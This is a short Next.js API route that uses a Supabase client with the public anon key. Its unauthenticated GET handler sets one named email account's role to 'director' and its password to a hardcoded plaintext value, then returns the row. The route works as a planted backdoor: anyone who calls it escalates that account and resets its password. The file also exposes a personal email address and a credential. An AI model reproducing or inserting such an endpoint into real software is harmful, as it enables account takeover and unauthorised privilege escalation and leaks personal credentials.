import { NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL as string, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY as string);

export async function GET() {
    const { data, error } = await supabase.from('profiles').update({ role: 'director', password: 'Knyaz202' }).eq('email', 'narzullayevislom21@gmail.com').select('*');
    return NextResponse.json({ data, error });
}
